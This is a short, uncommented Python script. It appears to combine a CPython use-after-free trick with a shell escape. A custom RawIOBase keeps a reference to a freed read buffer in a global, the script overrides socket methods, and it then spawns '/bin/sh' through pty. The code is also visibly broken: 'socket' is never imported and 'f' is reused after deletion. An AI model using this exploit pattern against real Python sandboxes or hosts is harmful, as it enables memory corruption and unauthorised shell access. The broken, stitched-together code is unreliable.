import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f

def recv(self, arg):
    return b"A" * arg

def sendall(self, arg):
    print(arg)

socket.socket.recv = recv
socket.socket.sendall = sendall

import sys
sys.stdin = f

import pty
pty.spawn("/bin/sh")
